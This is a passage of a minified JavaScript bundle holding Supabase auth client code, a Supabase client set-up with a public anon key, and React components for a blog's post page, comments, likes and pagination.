this.initializePromise,await this._acquireLock(-1,async()=>await this._refreshSession(t))}async _refreshSession(t){try{return await this._useSession(async r=>{var s;if(!t){const{data:d,error:h}=r;if(h)throw h;t=(s=d.session)!==null&&s!==void 0?s:void 0}if(!t?.refresh_token)throw new Gi;const{session:a,error:c}=await this._callRefreshToken(t.refresh_token);return c?{data:{user:null,session:null},error:c}:a?{data:{user:a.user,session:a},error:null}:{data:{user:null,session:null},error:null}})}catch(r){if(ye(r))return{data:{user:null,session:null},error:r};throw r}}async _getSessionFromURL(t){try{if(!Wt())throw new Bo("No browser detected.");if(this.flowType==="implicit"&&!this._isImplicitGrantFlow())throw new Bo("Not a valid implicit grant flow url.");if(this.flowType=="pkce"&&!t)throw new pg("Not a valid PKCE flow url.");const r=Ic(window.location.href);if(t){if(!r.code)throw new pg("No code detected.");const{data:R,error:M}=await this._exchangeCodeForSession(r.code);if(M)throw M;const O=new URL(window.location.href);return O.searchParams.delete("code"),window.history.replaceState(window.history.state,"",O.toString()),{data:{session:R.session,redirectType:null},error:null}}if(r.error||r.error_description||r.error_code)throw new Bo(r.error_description||"Error in URL with unspecified error_description",{error:r.error||"unspecified_error",code:r.error_code||"unspecified_code"});const{provider_token:s,provider_refresh_token:a,access_token:c,refresh_token:d,expires_in:h,expires_at:p,token_type:f}=r;if(!c||!h||!d||!f)throw new Bo("No session defined in URL");const m=Math.round(Date.now()/1e3),y=parseInt(h);let v=m+y;p&&(v=parseInt(p));const w=v-m;w*1e3<=Qr&&console.warn(`@supabase/gotrue-js: Session as retrieved from URL expires in ${w}s, should have been closer to ${y}s`);const P=v-y;m-P>=120?console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued over 120s ago, URL could be stale",P,v,m):m-P<0&&console.warn("@supabase/gotrue-js: Session as retrieved from URL was issued in the future? Check the device clok for skew",P,v,m);const{data:T,error:C}=await this._getUser(c);if(C)throw C;const L={provider_token:s,provider_refresh_token:a,access_token:c,expires_in:y,expires_at:v,refresh_token:d,token_type:f,user:T.user};return window.location.hash="",this._debug("#_getSessionFromURL()","clearing window.location.hash"),{data:{session:L,redirectType:r.type},error:null}}catch(r){if(ye(r))return{data:{session:null,redirectType:null},error:r};throw r}}_isImplicitGrantFlow(){const t=Ic(window.location.href);return!!(Wt()&&(t.access_token||t.error_description))}async _isPKCEFlow(){const t=Ic(window.location.href),r=await Oo(this.storage,`${this.storageKey}-code-verifier`);return!!(t.code&&r)}async signOut(t={scope:"global"}){return await this.initializePromise,await this._acquireLock(-1,async()=>await this._signOut(t))}async _signOut({scope:t}={scope:"global"}){return await this._useSession(async r=>{var s;const{data:a,error:c}=r;if(c)return{error:c};const d=(s=a.session)===null||s===void 0?void 0:s.access_token;if(d){const{error:h}=await this.admin.signOut(d,t);if(h&&!(_S(h)&&(h.status===404||h.status===401)))return{error:h}}return t!=="others"&&(await this._removeSession(),await _c(this.storage,`${this.storageKey}-code-verifier`),await this._notifyAllSubscribers("SIGNED_OUT",null)),{error:null}})}onAuthStateChange(t){const r=kS(),s={id:r,callback:t,unsubscribe:()=>{this._debug("#unsubscribe()","state change callback with id removed",r),this.stateChangeEmitters.delete(r)}};return this._debug("#onAuthStateChange()","registered callback with id",r),this.stateChangeEmitters.set(r,s),(async()=>(await this.initializePromise,await this._acquireLock(-1,async()=>{this._emitInitialSession(r)})))(),{data:{subscription:s}}}async _emitInitialSession(t){return await this._useSession(async r=>{var s,a;try{const{data:{session:c},error:d}=r;if(d)throw d;await((s=this.stateChangeEmitters.get(t))===null||s===void 0?void 0:s.callback("INITIAL_SESSION",c)),this._debug("INITIAL_SESSION","callback id",t,"session",c)}catch(c){await((a=this.stateChangeEmitters.get(t))===null||a===void 0?void 0:a.callback("INITIAL_SESSION",null)),this._debug("INITIAL_SESSION","callback id",t,"error",c),console.error(c)}})}async resetPasswordForEmail(t,r={}){let s=null,a=null;if(this.flowType==="pkce"){const c=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,`${c}/PASSWORD_RECOVERY`),s=await Hi(c),a=c===s?"plain":"s256"}try{return await ve(this.fetch,"POST",`${this.url}/recover`,{body:{email:t,code_challenge:s,code_challenge_method:a,gotrue_meta_security:{captcha_token:r.captchaToken}},headers:this.headers,redirectTo:r.redirectTo})}catch(c){if(ye(c))return{data:null,error:c};throw c}}async getUserIdentities(){var t;try{const{data:r,error:s}=await this.getUser();if(s)throw s;return{data:{identities:(t=r.user.identities)!==null&&t!==void 0?t:[]},error:null}}catch(r){if(ye(r))return{data:null,error:r};throw r}}async linkIdentity(t){var r;try{const{data:s,error:a}=await this._useSession(async c=>{var d,h,p,f,m;const{data:y,error:v}=c;if(v)throw v;const w=await this._getUrlForProvider(`${this.url}/user/identities/authorize`,t.provider,{redirectTo:(d=t.options)===null||d===void 0?void 0:d.redirectTo,scopes:(h=t.options)===null||h===void 0?void 0:h.scopes,queryParams:(p=t.options)===null||p===void 0?void 0:p.queryParams,skipBrowserRedirect:!0});return await ve(this.fetch,"GET",w,{headers:this.headers,jwt:(m=(f=y.session)===null||f===void 0?void 0:f.access_token)!==null&&m!==void 0?m:void 0})});if(a)throw a;return Wt()&&!(!((r=t.options)===null||r===void 0)&&r.skipBrowserRedirect)&&window.location.assign(s?.url),{data:{provider:t.provider,url:s?.url},error:null}}catch(s){if(ye(s))return{data:{provider:t.provider,url:null},error:s};throw s}}async unlinkIdentity(t){try{return await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)throw d;return await ve(this.fetch,"DELETE",`${this.url}/user/identities/${t.identity_id}`,{headers:this.headers,jwt:(a=(s=c.session)===null||s===void 0?void 0:s.access_token)!==null&&a!==void 0?a:void 0})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _refreshAccessToken(t){const r=`#_refreshAccessToken(${t.substring(0,5)}...)`;this._debug(r,"begin");try{const s=Date.now();return await AS(async a=>(await SS(a*200),this._debug(r,"refreshing attempt",a),await ve(this.fetch,"POST",`${this.url}/token?grant_type=refresh_token`,{body:{refresh_token:t},headers:this.headers,xform:ai})),(a,c,d)=>d&&d.error&&Dc(d.error)&&Date.now()+(a+1)*200-s<Qr)}catch(s){if(this._debug(r,"error",s),ye(s))return{data:{session:null,user:null},error:s};throw s}finally{this._debug(r,"end")}}_isValidSession(t){return typeof t=="object"&&t!==null&&"access_token"in t&&"refresh_token"in t&&"expires_at"in t}async _handleProviderSignIn(t,r){const s=await this._getUrlForProvider(`${this.url}/authorize`,t,{redirectTo:r.redirectTo,scopes:r.scopes,queryParams:r.queryParams});return this._debug("#_handleProviderSignIn()","provider",t,"options",r,"url",s),Wt()&&!r.skipBrowserRedirect&&window.location.assign(s),{data:{provider:t,url:s},error:null}}async _recoverAndRefresh(){var t;const r="#_recoverAndRefresh()";this._debug(r,"begin");try{const s=await Oo(this.storage,this.storageKey);if(this._debug(r,"session from storage",s),!this._isValidSession(s)){this._debug(r,"session is not valid"),s!==null&&await this._removeSession();return}const a=Math.round(Date.now()/1e3),c=((t=s.expires_at)!==null&&t!==void 0?t:1/0)<a+mg;if(this._debug(r,`session has${c?"":" not"} expired with margin of ${mg}s`),c){if(this.autoRefreshToken&&s.refresh_token){const{error:d}=await this._callRefreshToken(s.refresh_token);d&&(console.error(d),Dc(d)||(this._debug(r,"refresh failed with a non-retryable error, removing the session",d),await this._removeSession()))}}else await this._notifyAllSubscribers("SIGNED_IN",s)}catch(s){this._debug(r,"error",s),console.error(s);return}finally{this._debug(r,"end")}}async _callRefreshToken(t){var r,s;if(!t)throw new Gi;if(this.refreshingDeferred)return this.refreshingDeferred.promise;const a=`#_callRefreshToken(${t.substring(0,5)}...)`;this._debug(a,"begin");try{this.refreshingDeferred=new da;const{data:c,error:d}=await this._refreshAccessToken(t);if(d)throw d;if(!c.session)throw new Gi;await this._saveSession(c.session),await this._notifyAllSubscribers("TOKEN_REFRESHED",c.session);const h={session:c.session,error:null};return this.refreshingDeferred.resolve(h),h}catch(c){if(this._debug(a,"error",c),ye(c)){const d={session:null,error:c};return Dc(c)||(await this._removeSession(),await this._notifyAllSubscribers("SIGNED_OUT",null)),(r=this.refreshingDeferred)===null||r===void 0||r.resolve(d),d}throw(s=this.refreshingDeferred)===null||s===void 0||s.reject(c),c}finally{this.refreshingDeferred=null,this._debug(a,"end")}}async _notifyAllSubscribers(t,r,s=!0){const a=`#_notifyAllSubscribers(${t})`;this._debug(a,"begin",r,`broadcast = ${s}`);try{this.broadcastChannel&&s&&this.broadcastChannel.postMessage({event:t,session:r});const c=[],d=Array.from(this.stateChangeEmitters.values()).map(async h=>{try{await h.callback(t,r)}catch(p){c.push(p)}});if(await Promise.all(d),c.length>0){for(let h=0;h<c.length;h+=1)console.error(c[h]);throw c[0]}}finally{this._debug(a,"end")}}async _saveSession(t){this._debug("#_saveSession()",t),await ii(this.storage,this.storageKey,t)}async _removeSession(){this._debug("#_removeSession()"),await _c(this.storage,this.storageKey)}_removeVisibilityChangedCallback(){this._debug("#_removeVisibilityChangedCallback()");const t=this.visibilityChangedCallback;this.visibilityChangedCallback=null;try{t&&Wt()&&window?.removeEventListener&&window.removeEventListener("visibilitychange",t)}catch(r){console.error("removing visibilitychange callback failed",r)}}async _startAutoRefresh(){await this._stopAutoRefresh(),this._debug("#_startAutoRefresh()");const t=setInterval(()=>this._autoRefreshTokenTick(),Qr);this.autoRefreshTicker=t,t&&typeof t=="object"&&typeof t.unref=="function"?t.unref():typeof Deno<"u"&&typeof Deno.unrefTimer=="function"&&Deno.unrefTimer(t),setTimeout(async()=>{await this.initializePromise,await this._autoRefreshTokenTick()},0)}async _stopAutoRefresh(){this._debug("#_stopAutoRefresh()");const t=this.autoRefreshTicker;this.autoRefreshTicker=null,t&&clearInterval(t)}async startAutoRefresh(){this._removeVisibilityChangedCallback(),await this._startAutoRefresh()}async stopAutoRefresh(){this._removeVisibilityChangedCallback(),await this._stopAutoRefresh()}async _autoRefreshTokenTick(){this._debug("#_autoRefreshTokenTick()","begin");try{await this._acquireLock(0,async()=>{try{const t=Date.now();try{return await this._useSession(async r=>{const{data:{session:s}}=r;if(!s||!s.refresh_token||!s.expires_at){this._debug("#_autoRefreshTokenTick()","no session");return}const a=Math.floor((s.expires_at*1e3-t)/Qr);this._debug("#_autoRefreshTokenTick()",`access token expires in ${a} ticks, a tick lasts ${Qr}ms, refresh threshold is ${bg} ticks`),a<=bg&&await this._callRefreshToken(s.refresh_token)})}catch(r){console.error("Auto refresh tick failed with error. This is likely a transient error.",r)}}finally{this._debug("#_autoRefreshTokenTick()","end")}})}catch(t){if(t.isAcquireTimeout||t instanceof Jy)this._debug("auto refresh token tick lock not available");else throw t}}async _handleVisibilityChange(){if(this._debug("#_handleVisibilityChange()"),!Wt()||!window?.addEventListener)return this.autoRefreshToken&&this.startAutoRefresh(),!1;try{this.visibilityChangedCallback=async()=>await this._onVisibilityChanged(!1),window?.addEventListener("visibilitychange",this.visibilityChangedCallback),await this._onVisibilityChanged(!0)}catch(t){console.error("_handleVisibilityChange",t)}}async _onVisibilityChanged(t){const r=`#_onVisibilityChanged(${t})`;this._debug(r,"visibilityState",document.visibilityState),document.visibilityState==="visible"?(this.autoRefreshToken&&this._startAutoRefresh(),t||(await this.initializePromise,await this._acquireLock(-1,async()=>{if(document.visibilityState!=="visible"){this._debug(r,"acquired the lock to recover the session, but the browser visibilityState is no longer visible, aborting");return}await this._recoverAndRefresh()}))):document.visibilityState==="hidden"&&this.autoRefreshToken&&this._stopAutoRefresh()}async _getUrlForProvider(t,r,s){const a=[`provider=${encodeURIComponent(r)}`];if(s?.redirectTo&&a.push(`redirect_to=${encodeURIComponent(s.redirectTo)}`),s?.scopes&&a.push(`scopes=${encodeURIComponent(s.scopes)}`),this.flowType==="pkce"){const c=$i();await ii(this.storage,`${this.storageKey}-code-verifier`,c);const d=await Hi(c),h=c===d?"plain":"s256";this._debug("PKCE","code verifier",`${c.substring(0,5)}...`,"code challenge",d,"method",h);const p=new URLSearchParams({code_challenge:`${encodeURIComponent(d)}`,code_challenge_method:`${encodeURIComponent(h)}`});a.push(p.toString())}if(s?.queryParams){const c=new URLSearchParams(s.queryParams);a.push(c.toString())}return s?.skipBrowserRedirect&&a.push(`skip_http_redirect=${s.skipBrowserRedirect}`),`${t}?${a.join("&")}`}async _unenroll(t){try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;return c?{data:null,error:c}:await ve(this.fetch,"DELETE",`${this.url}/factors/${t.factorId}`,{headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _enroll(t){try{return await this._useSession(async r=>{var s,a;const{data:c,error:d}=r;if(d)return{data:null,error:d};const{data:h,error:p}=await ve(this.fetch,"POST",`${this.url}/factors`,{body:{friendly_name:t.friendlyName,factor_type:t.factorType,issuer:t.issuer},headers:this.headers,jwt:(s=c?.session)===null||s===void 0?void 0:s.access_token});return p?{data:null,error:p}:(!((a=h?.totp)===null||a===void 0)&&a.qr_code&&(h.totp.qr_code=`data:image/svg+xml;utf-8,${h.totp.qr_code}`),{data:h,error:null})})}catch(r){if(ye(r))return{data:null,error:r};throw r}}async _verify(t){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;if(c)return{data:null,error:c};const{data:d,error:h}=await ve(this.fetch,"POST",`${this.url}/factors/${t.factorId}/verify`,{body:{code:t.code,challenge_id:t.challengeId},headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token});return h?{data:null,error:h}:(await this._saveSession(Object.assign({expires_at:Math.round(Date.now()/1e3)+d.expires_in},d)),await this._notifyAllSubscribers("MFA_CHALLENGE_VERIFIED",d),{data:d,error:h})})}catch(r){if(ye(r))return{data:null,error:r};throw r}})}async _challenge(t){return this._acquireLock(-1,async()=>{try{return await this._useSession(async r=>{var s;const{data:a,error:c}=r;return c?{data:null,error:c}:await ve(this.fetch,"POST",`${this.url}/factors/${t.factorId}/challenge`,{headers:this.headers,jwt:(s=a?.session)===null||s===void 0?void 0:s.access_token})})}catch(r){if(ye(r))return{data:null,error:r};throw r}})}async _challengeAndVerify(t){const{data:r,error:s}=await this._challenge({factorId:t.factorId});return s?{data:null,error:s}:await this._verify({factorId:t.factorId,challengeId:r.id,code:t.code})}async _listFactors(){const{data:{user:t},error:r}=await this.getUser();if(r)return{data:null,error:r};const s=t?.factors||[],a=s.filter(c=>c.factor_type==="totp"&&c.status==="verified");return{data:{all:s,totp:a},error:null}}async _getAuthenticatorAssuranceLevel(){return this._acquireLock(-1,async()=>await this._useSession(async t=>{var r,s;const{data:{session:a},error:c}=t;if(c)return{data:null,error:c};if(!a)return{data:{currentLevel:null,nextLevel:null,currentAuthenticationMethods:[]},error:null};const d=this._decodeJWT(a.access_token);let h=null;d.aal&&(h=d.aal);let p=h;((s=(r=a.user.factors)===null||r===void 0?void 0:r.filter(y=>y.status==="verified"))!==null&&s!==void 0?s:[]).length>0&&(p="aal2");const m=d.amr||[];return{data:{currentLevel:h,nextLevel:p,currentAuthenticationMethods:m},error:null}}))}}ds.nextInstanceID=0;class QS extends ds{constructor(t){super(t)}}var YS=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};const XS={headers:pS},ZS={schema:"public"},e3={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},t3={};class n3{constructor(t,r,s){var a,c,d,h,p,f,m,y;if(this.supabaseUrl=t,this.supabaseKey=r,!t)throw new Error("supabaseUrl is required.");if(!r)throw new Error("supabaseKey is required.");const v=bS(t);this.realtimeUrl=`${v}/realtime/v1`.replace(/^http/i,"ws"),this.authUrl=`${v}/auth/v1`,this.storageUrl=`${v}/storage/v1`,this.functionsUrl=`${v}/functions/v1`;const w=`sb-${new URL(this.authUrl).hostname.split(".")[0]}-auth-token`,P={db:ZS,realtime:t3,auth:Object.assign(Object.assign({},e3),{storageKey:w}),global:XS},T=vS(s??{},P);this.storageKey=(c=(a=T.auth)===null||a===void 0?void 0:a.storageKey)!==null&&c!==void 0?c:"",this.headers=(h=(d=T.global)===null||d===void 0?void 0:d.headers)!==null&&h!==void 0?h:{},this.auth=this._initSupabaseAuthClient((p=T.auth)!==null&&p!==void 0?p:{},this.headers,(f=T.global)===null||f===void 0?void 0:f.fetch),this.fetch=yS(r,this._getAccessToken.bind(this),(m=T.global)===null||m===void 0?void 0:m.fetch),this.realtime=this._initRealtimeClient(Object.assign({headers:this.headers},T.realtime)),this.rest=new Nd(`${v}/rest/v1`,{headers:this.headers,schema:(y=T.db)===null||y===void 0?void 0:y.schema,fetch:this.fetch}),this._listenForAuthEvents()}get functions(){return new IT(this.functionsUrl,{headers:this.headers,customFetch:this.fetch})}get storage(){return new uS(this.storageUrl,this.headers,this.fetch)}from(t){return this.rest.from(t)}schema(t){return this.rest.schema(t)}rpc(t,r={},s){return this.rest.rpc(t,r,s)}channel(t,r={config:{}}){return this.realtime.channel(t,r)}getChannels(){return this.realtime.getChannels()}removeChannel(t){return this.realtime.removeChannel(t)}removeAllChannels(){return this.realtime.removeAllChannels()}_getAccessToken(){var t,r;return YS(this,void 0,void 0,function*(){const{data:s}=yield this.auth.getSession();return(r=(t=s.session)===null||t===void 0?void 0:t.access_token)!==null&&r!==void 0?r:null})}_initSupabaseAuthClient({autoRefreshToken:t,persistSession:r,detectSessionInUrl:s,storage:a,storageKey:c,flowType:d,debug:h},p,f){const m={Authorization:`Bearer ${this.supabaseKey}`,apikey:`${this.supabaseKey}`};return new QS({url:this.authUrl,headers:Object.assign(Object.assign({},m),p),storageKey:c,autoRefreshToken:t,persistSession:r,detectSessionInUrl:s,storage:a,flowType:d,debug:h,fetch:f})}_initRealtimeClient(t){return new XT(this.realtimeUrl,Object.assign(Object.assign({},t),{params:Object.assign({apikey:this.supabaseKey},t?.params)}))}_listenForAuthEvents(){return this.auth.onAuthStateChange((r,s)=>{this._handleTokenChanged(r,"CLIENT",s?.access_token)})}_handleTokenChanged(t,r,s){(t==="TOKEN_REFRESHED"||t==="SIGNED_IN")&&this.changedAccessToken!==s?(this.realtime.setAuth(s??null),this.changedAccessToken=s):t==="SIGNED_OUT"&&(this.realtime.setAuth(this.supabaseKey),r=="STORAGE"&&this.auth.signOut(),this.changedAccessToken=void 0)}}const i3=(i,t,r)=>new n3(i,t,r),r3="https://ilgxqdnvxresxgnqkcmg.supabase.co",s3="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlsZ3hxZG52eHJlc3hnbnFrY21nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDcxNTAxMzMsImV4cCI6MjA2MjcyNjEzM30.fQ-pvwNj-qSh1CAnx7XDxm9YL1vpLi-VGtlWiudt4jw",qe=i3(r3,s3),o3=({postId:i})=>{const{theme:t}=Vn(),{toast:r}=Od(),[s,a]=S.useState(0),[c,d]=S.useState(0),[h,p]=S.useState([]),[f,m]=S.useState(""),[y,v]=S.useState("Anonymous"),[w,P]=S.useState(!1),[T,C]=S.useState(!0),L=S.useCallback(async()=>{if(!qe)return null;const{error:$}=await qe.from("posts").insert({id:i},{upsert:!0,ignoreDuplicates:!0});if($&&$.code!=="23505")return console.error("Error ensuring post entry:",$),r({title:"Error",description:"Could not initialize post data.",variant:"destructive"}),null;let{data:ae,error:H}=await qe.from("posts").select("view_count, like_count").eq("id",i).single();return H?(console.error("Error fetching post data after upsert:",H),null):ae},[i,r]),R=S.useCallback(async()=>{if(!qe)return;const{data:$,error:ae}=await qe.from("comments").select("*").eq("post_id",i).order("created_at",{ascending:!1});$&&p($),ae&&console.error("Error fetching comments:",ae)},[i]);S.useEffect(()=>{(async()=>{if(!qe){C(!1),r({title:"Interactions Disabled",description:"Supabase is not connected. Interactions are disabled.",variant:"destructive"});return}C(!0);const ae=await L();if(ae){a(ae.view_count),d(ae.like_count);const{error:he}=await qe.rpc("increment_view",{post_row_id:i});he?console.error("Error incrementing view:",he):a(oe=>oe+1)}await R(),JSON.parse(localStorage.getItem("user_liked_posts")||"[]").includes(i)&&P(!0),C(!1)})()},[i,L,R,r]);const M=async()=>{if(w||!qe)return;P(!0),d(ae=>ae+1);const{error:$}=await qe.rpc("increment_like",{post_row_id:i});if($)P(!1),d(ae=>ae-1),r({title:"Error",description:"Couldn't like the post.",variant:"destructive"});else{const ae=JSON.parse(localStorage.getItem("user_liked_posts")||"[]");ae.push(i),localStorage.setItem("user_liked_posts",JSON.stringify(ae)),r({title:"Thanks!",description:"You've liked this post. ❤️"})}},O=async $=>{if($.preventDefault(),!f.trim()||!qe)return;const ae={post_id:i,author:y.trim()||"Anonymous",content:f.trim()},{data:H,error:he}=await qe.from("comments").insert(ae).select().single();he?(console.error("Error posting comment:",he),r({title:"Error",description:"Could not post comment. Please try again.",variant:"destructive"})):(p(oe=>[H,...oe]),m(""),r({title:"Comment Posted!",description:"Your comment has been successfully added."}))},W=async $=>{if(!qe)return;const ae=[...h];p(h.filter(he=>he.id!==$));const{error:H}=await qe.from("comments").delete().eq("id",$);H?(p(ae),r({title:"Error",description:"Could not delete comment.",variant:"destructive"})):r({title:"Comment Deleted",description:"The comment has been removed."})},J=t==="dark"?"border-slate-700/50":"border-border",G=t==="dark"?"text-primary":"text-foreground",X=t==="dark"?"text-slate-400":"text-muted-foreground",ie=t==="dark"?"bg-slate-800":"bg-background",ge=t==="dark"?"bg-slate-800/50":"bg-slate-100/80",Ae=w?"bg-red-500/20 text-red-500 cursor-not-allowed":"hover:bg-red-500/10 hover:text-red-500";return T?x.jsx("div",{className:"text-center p-4",children:"Loading interactions..."}):qe?x.jsxs(et.div,{initial:{opacity:0},animate:{opacity:1},transition:{delay:.5,duration:.5},className:`mt-12 pt-8 border-t ${J}`,children:[x.jsxs("div",{className:"flex items-center justify-between mb-8",children:[x.jsx("h2",{className:`text-2xl font-bold ${G}`,children:"Interactions"}),x.jsxs("div",{className:`flex items-center space-x-4 ${X}`,children:[x.jsxs("div",{className:"flex items-center space-x-1",title:`${s} views`,children:[x.jsx(fw,{size:20}),x.jsx("span",{children:s})]}),x.jsxs(Ht,{variant:"ghost",size:"sm",className:`flex items-center space-x-1 ${Ae}`,onClick:M,disabled:w,children:[x.jsx(mw,{size:20,className:w?"fill-current":""}),x.jsx("span",{children:c})]})]})]}),x.jsxs("div",{className:"space-y-6",children:[x.jsxs("h3",{className:`text-xl font-semibold flex items-center ${G}`,children:[x.jsx(vw,{className:"mr-2"})," Comments (",h.length,")"]}),x.jsxs("form",{onSubmit:O,className:"space-y-4",children:[x.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-3 gap-4",children:x.jsx(aa,{type:"text",placeholder:"Your name (optional)",value:y,onChange:$=>v($.target.value),className:`${ie} col-span-1 sm:col-span-1`})}),x.jsx(hy,{placeholder:"Write a comment...",value:f,onChange:$=>m($.target.value),className:`${ie} h-24`}),x.jsx("div",{className:"flex justify-end",children:x.jsxs(Ht,{type:"submit",disabled:!f.trim(),children:[x.jsx(kw,{size:16,className:"mr-2"})," Post Comment"]})})]}),x.jsx("div",{className:"space-y-4",children:x.jsx(U1,{children:h.map($=>x.jsxs(et.div,{className:`p-4 rounded-lg ${ge} relative group`,initial:{opacity:0,y:20},animate:{opacity:1,y:0},exit:{opacity:0,x:-20},transition:{duration:.3},children:[x.jsxs("div",{className:"flex justify-between items-start",children:[x.jsxs("div",{children:[x.jsx("p",{className:"font-semibold text-primary",children:$.author}),x.jsx("p",{className:`text-xs ${X}`,children:new Date($.created_at).toLocaleString()})]}),x.jsx(Ht,{variant:"ghost",size:"icon",className:"h-8 w-8 opacity-0 group-hover:opacity-100 transition-opacity text-destructive hover:bg-destructive/10",onClick:()=>W($.id),children:x.jsx(Tw,{size:16})})]}),x.jsx("p",{className:"mt-2 text-foreground/90",children:$.content})]},$.id))})})]})]}):null},a3=({postId:i})=>{const{theme:t}=Vn(),[r,s]=S.useState(null),[a,c]=S.useState(!0),[d,h]=S.useState("");S.useEffect(()=>{c(!0);const R=q1(i);s(R),R&&h(Xo[R.imageKey]||Xo.default),c(!1),window.scrollTo(0,0)},[i]);const p=t==="dark"?"bg-card":"bg-background",f="text-primary hover:text-primary/80",m=t==="dark"?"border-slate-700/50":"border-border",y=t==="dark"?"text-primary":"text-foreground",v=t==="dark"?"text-slate-400":"text-muted-foreground",w=t==="dark"?"text-accent":"text-primary",P=t==="dark"?"bg-secondary text-primary/90":"bg-secondary text-secondary-foreground",T=t==="dark"?"text-slate-300":"text-foreground/90",C=t==="dark"?"prose-invert":"",L="border-primary";return a?x.jsx("div",{className:"flex justify-center items-center min-h-[60vh]",children:x.jsx("div",{className:`animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 ${L}`})}):r?x.jsxs(et.article,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},className:`max-w-3xl mx-auto ${p} p-6 sm:p-8 md:p-10 rounded-xl ${t==="light"?"shadow-xl":"shadow-2xl"}`,children:[x.jsx("div",{className:"mb-8",children:x.jsxs("a",{href:"#/all-blogs",className:`inline-flex items-center ${f} transition-colors mb-6 group font-semibold text-sm`,children:[x.jsx(uw,{size:18,className:"mr-2 group-hover:-translate-x-1 transition-transform"}),"Back to Blog"]})}),x.jsxs("header",{className:`mb-8 border-b ${m} pb-8`,children:[x.jsx("h1",{className:`text-3xl md:text-4xl font-bold mb-4 ${y} leading-tight`,children:r.title}),x.jsxs("div",{className:`flex flex-wrap items-center gap-x-4 gap-y-2 ${v} text-sm`,children:[x.jsxs("span",{className:"flex items-center",children:[x.jsx(Tg,{size:16,className:`mr-1.5 ${w}`})," Published on ",r.date]}),x.jsxs("span",{className:"flex items-center",children:[x.jsx(Ag,{size:16,className:`mr-1.5 ${w}`})," By ",r.author]})]}),r.tags&&r.tags.length>0&&x.jsxs("div",{className:"mt-4 flex flex-wrap items-center gap-2",children:[x.jsx(xw,{size:16,className:`${w}`}),r.tags.map(R=>x.jsx("span",{className:`px-2.5 py-1 ${P} text-xs rounded-full font-medium`,children:R},R))]})]}),d&&x.jsx("div",{className:"mb-8 h-64 md:h-80 w-full overflow-hidden rounded-lg shadow-md",children:x.jsx("img",{className:"w-full h-full object-cover",alt:`Illustration for ${r.title}`,src:d})}),x.jsx("div",{className:`prose ${C} prose-base md:prose-lg max-w-none content-area ${T}`,dangerouslySetInnerHTML:{__html:r.content}}),x.jsx(o3,{postId:i})]}):x.jsx(uy,{})},l3=({currentPage:i,totalPages:t,onPageChange:r})=>{const s=()=>{i>1&&r(i-1)},a=()=>{i<t&&r(i+1)};if(t<=1)return null;const c=[],d=5;let h=Math.max(1,i-Math.floor(d/2)),p=Math.min(t,h+d-1);p-h+1<d&&(h=Math.max(1,p-d+1));for(let f=h;f<=p;f++)c.push(f);return x.jsxs("div",{className:"flex items-center justify-center space-x-2 mt-12",children:[x.jsx(Ht,{variant:"outline",size:"icon",onClick:s,disabled:i===1,"aria-label":"Go to previous page",children:x.jsx(hw,{className:"h-5 w-5"})}),h>1&&x.jsxs(x.Fragment,{children:[x.jsx(Ht,{variant:"outline",onClick:()=>r(1),children:"1"}),h>2&&x.jsx("span",{className:"text-muted-foreground",children:"..."})]}),c.map(f=>x.jsx(Ht,{variant:i===f?"default":"outline",onClick:()=>r(f),"aria-current":i===f?"page":void 0,children:f},f)),p<t&&x.jsxs(x.Fragment,{children:[p<t-1&&x.jsx("span",{className:"text-muted-foreground",children:"..."}),x.jsx(Ht,{variant:"outline",onClick:()=>r(t),children:t})]}),x.jsx(Ht,{variant:"outline",size:"icon",onClick:a,disabled:i===t,"aria-label":"Go to next page",children:x.jsx(pw,{className:"h-5 w-5"})})]})},Mc=9,c3=({searchTerm:i,setSearchTerm:t})=>{const{theme:r}=Vn(),[s,a]=S.useState(1),[c,d]=S.useState([]),h=S.useMemo(()=>{let R=[...Ed];return i&&(R=R.filter(M=>M.title.toLowerCase().includes(i.toLowerCase())||M.summary.toLowerCase().includes(i.toLowerCase())||M.tags&&M.tags.some(O=>O.toLowerCase().includes(i.toLowerCase())))),R.sort((M,O)=>new Date(O.date)-new Date(M.date))},[i]),p=Math.ceil(h.length/Mc);S.useEffect(()=>{const R=(s-1)*Mc,M=R+Mc;d(h.slice(R,M)),(i||s>1)&&window.scrollTo({top:0,behavior:"smooth"})},[s,h,i]);const f=R=>{a(R)},m=S.useCallback(R=>{t(R.target.value),a(1)},[t]),y=S.useCallback(()=>{t(""),a(1)},[t]),v={hidden:{opacity:0},visible:{opacity:1,transition:{staggerChildren:.1}}},w=r==="dark"?"bg-gradient-to-br from-slate-900 via-background to-slate-950":"bg-gradient-to-br from-slate-50 via-gray-100 to-slate-100",P=r==="dark"?"bg-clip-text text-transparent bg-gradient-to-r from-primary via-accent to-primary":"text-foreground",T=r==="dark"?"text-slate-400":"text-muted-foreground",C=r==="dark"?"bg-slate-800/60 border-slate-700 text-slate-200 placeholder-slate-500 focus:ring-primary focus:border-primary":"bg-background border-border text-foreground placeholder-muted-foreground focus:ring-primary focus:border-primary shadow-sm",L=r==="dark"?"text-slate-500 group-focus-within:text-primary":"text-muted-foreground group-focus-within:text-primary";return x.jsxs("div",{className:"space-y-12",children:[x.jsxs(et.section,{initial:{opacity:0,y:-30},animate:{opacity:1,y:0},transition:{duration:.5,ease:"easeOut"},className:`text-center py-16 md:py-20 ${w} rounded-xl shadow-lg p-8`,children:[x.jsx(kg,{size:48,className:`mx-auto mb-4 